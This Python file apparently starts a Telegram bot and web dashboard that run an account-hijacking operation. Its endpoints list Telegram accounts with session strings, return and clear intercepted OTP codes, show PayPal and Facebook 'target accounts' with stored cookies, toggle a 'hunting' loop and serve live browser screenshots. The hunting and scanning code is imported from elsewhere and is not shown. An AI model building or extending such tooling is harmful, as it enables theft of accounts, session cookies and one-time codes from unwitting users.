import asyncio
asyncio.set_event_loop(asyncio.new_event_loop())

import logging
import aiohttp
import os
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse, Response
import uvicorn
import config

from aiogram import Bot, Dispatcher
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery

from handlers.user import user_router
from handlers.admin import admin_router
from handlers.owner import owner_router
from core.scanner import start_scanner, backup_scanner, whatsapp_scanner
from services.telegram_automation import auto_hunter_loop, reset_watchdog_loop
from services.proxy_manager import proxy_scanner_loop
import database as db

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("Main")

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
dp.include_routers(owner_router, admin_router, user_router)


@dp.callback_query(lambda c: c.data and c.data.startswith("copy_otp_"))
async def copy_otp_callback(cq: CallbackQuery):
    otp = cq.data.split("_")[2]
    await cq.answer(f"📋 OTP: {otp}\n\n(Manually copy karein)", show_alert=True)


async def self_ping():
    url = f"http://127.0.0.1:{config.PORT}/api/health"
    while True:
        await asyncio.sleep(600)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as resp:
                    pass
        except Exception as e:
            log.debug(f"self_ping failed: {e}")


async def _db_flush_loop():
    while True:
        await asyncio.sleep(60) 
        try:
            db.flush_pending()
        except Exception as e:
            log.warning(f"db flush failed: {e}")


@asynccontextmanager
async def lifespan(app: FastAPI):
    log.info("Starting Bot Polling and Scanners...")
    asyncio.create_task(dp.start_polling(bot))
    asyncio.create_task(start_scanner(bot))
    asyncio.create_task(backup_scanner(bot))
    asyncio.create_task(whatsapp_scanner(bot))
    asyncio.create_task(auto_hunter_loop(bot))
    asyncio.create_task(reset_watchdog_loop(bot))
    asyncio.create_task(proxy_scanner_loop())
    asyncio.create_task(self_ping())
    asyncio.create_task(_db_flush_loop())
    yield
    log.info("Shutting down...")
    await bot.session.close()


app = FastAPI(lifespan=lifespan)

@app.get("/", response_class=HTMLResponse)
async def serve_dashboard():
    try:
        with open("web_panel/templates/index.html", "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    except Exception as e:
        return HTMLResponse(content=f"<h1>Error: {e}</h1>", status_code=500)

@app.get("/telegram", response_class=HTMLResponse)
async def serve_telegram():
    try:
        with open("web_panel/templates/telegram.html", "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    except Exception as e:
        return HTMLResponse(content=f"<h1>Error: {e}</h1>", status_code=500)

@app.get("/tg_panel", response_class=HTMLResponse)
async def serve_tg_panel():
    try:
        with open("web_panel/templates/tg_panel.html", "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    except Exception as e:
        return HTMLResponse(content=f"<h1>Error: {e}</h1>", status_code=500)

@app.get("/mini_panel/{token}", response_class=HTMLResponse)
async def serve_mini_panel(token: str):
    d = db.load_data()
    if token not in d.get("mini_tokens", {}):
        raise HTTPException(status_code=403, detail="Invalid or Expired Token")
    try:
        with open("web_panel/templates/mini_panel.html", "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read().replace("{{ token }}", token))
    except Exception as e:
        return HTMLResponse(content=f"<h1>Error: {e}</h1>", status_code=500)

@app.get("/api/get_accounts")
async def get_accounts():
    d = db.load_data()
    result = []
    for phone, acc in d.get("telegram_accounts", {}).items():
        otps = acc.get("otps", [])
        result.append({
            "phone": phone,
            "status": acc.get("status", "unknown"),
            "session": (acc.get("session", "")[:15] + "...") if acc.get("session") else "No Session",
            "device_id": acc.get("device_id", "Unknown"),
            "ai_task": f"Monitoring {phone}...",
            "reset_time": acc.get("reset_time", 0),
            "otp_count": len(otps),
            "last_otp_time": otps[0].get("time", 0) if otps else 0,
        })
    return JSONResponse(content={"status": "success", "accounts": result})

# 🚨 NAYA ENDPOINT: Paypal/FB accounts ke liye
@app.get("/api/get_target_accounts")
async def get_target_accounts():
    d = db.load_data()
    result = []
    for acc_id, acc in d.get("target_accounts", {}).items():
        result.append({
            "id": acc_id,
            "platform": acc.get("platform", "Unknown"),
            "phone": acc.get("phone", "Unknown"),
            "status": acc.get("status", "unknown"),
            "time": acc.get("time", 0),
            "cookies": acc.get("cookies", "")[:15] + "..."
        })
    return JSONResponse(content={"status": "success", "targets": result})

@app.get("/api/get_account_otps")
async def get_account_otps(phone: str):
    d = db.load_data()
    acc = d.get("telegram_accounts", {}).get(phone)
    if not acc:
        return JSONResponse(content={"status": "error", "reason": "Account not found", "otps": []}, status_code=404)
    return JSONResponse(content={"status": "success", "otps": acc.get("otps", [])})

@app.post("/api/clear_account_otps")
async def clear_account_otps(request: Request):
    try:
        body = await request.json()
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid JSON")
    phone = body.get("phone")
    d = db.load_data()
    if phone in d.get("telegram_accounts", {}):
        d["telegram_accounts"][phone]["otps"] = []
        db.save_data(d, force=True)
    return JSONResponse(content={"status": "success"})

@app.get("/api/hunting_status")
async def hunting_status():
    return JSONResponse(content={"enabled": db.load_data().get("hunting_enabled", True)})

@app.post("/api/toggle_hunting")
async def toggle_hunting(request: Request):
    try:
        body = await request.json()
    except Exception:
        body = {}
    d = db.load_data()
    action = body.get("action")
    if action == "start": d["hunting_enabled"] = True
    elif action == "stop": d["hunting_enabled"] = False
    else: d["hunting_enabled"] = not d.get("hunting_enabled", True)
    db.save_data(d, force=True)
    return JSONResponse(content={"status": "success", "enabled": d["hunting_enabled"]})

@app.get("/api/health")
async def get_health():
    status = db.get_bot_status()
    d = db.load_data()
    accounts = d.get("telegram_accounts", {})
    active = sum(1 for a in accounts.values() if a.get("status") == "active")
    total = len(accounts)
    return JSONResponse(content={
        "task": status.get("task", "Idle"),
        "detail": status.get("detail", "Waiting..."),
        "last_update": status.get("last_update", 0),
        "accounts_count": total,
        "active_accounts": active,
        "working_proxies": len(d.get("working_proxies", [])),
        "completion_rate": round((active / total) * 100, 1) if total else 0.0,
        "hunting_enabled": d.get("hunting_enabled", True),
    })

@app.get("/api/activity_feed")
async def activity_feed():
    return JSONResponse(content={"status": "success", "feed": db.get_activity_feed()})

@app.post("/api/clear_feed")
async def clear_feed():
    db.clear_activity_feed()
    return JSONResponse(content={"status": "success"})

@app.get("/api/live_screenshot")
async def get_live_screenshot():
    try:
        if os.path.exists("live_browser.png"):
            with open("live_browser.png", "rb") as f:
                return Response(content=f.read(), media_type="image/png", headers={"Cache-Control": "no-store"})
        return JSONResponse(content={"error": "No screenshot found"}, status_code=404)
    except Exception as e:
        return JSONResponse(content={"error": str(e)}, status_code=500)

@app.get("/api/get_profile")
async def get_profile():
    return JSONResponse(content={"status": "success", "profile": db.load_data().get("owner_profile", {})})

@app.post("/api/save_profile")
async def save_profile(request: Request):
    try: body = await request.json()
    except Exception: raise HTTPException(status_code=400, detail="Invalid JSON")
    d = db.load_data()
    d["owner_profile"] = {"username": body.get("username","").strip(), "email": body.get("email","").strip(), "rank": body.get("rank","S-RANK HUNTER")}
    db.save_data(d, force=True)
    return JSONResponse(content={"status": "success"})

@app.get("/api/get_settings")
async def get_settings():
    return JSONResponse(content={"status": "success", "settings": db.load_data().get("owner_settings", {})})

@app.post("/api/save_settings")
async def save_settings(request: Request):
    try: body = await request.json()
    except Exception: raise HTTPException(status_code=400, detail="Invalid JSON")
    d = db.load_data()
    d["owner_settings"] = {
        "poll_interval": max(1, min(30, int(body.get("poll_interval", 3)))),
        "sound_enabled": bool(body.get("sound_enabled", True)),
        "discord_webhook": body.get("discord_webhook", ""),
        "api_base": body.get("api_base", "/api"),
    }
    db.save_data(d, force=True)
    return JSONResponse(content={"status": "success"})

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=config.PORT)
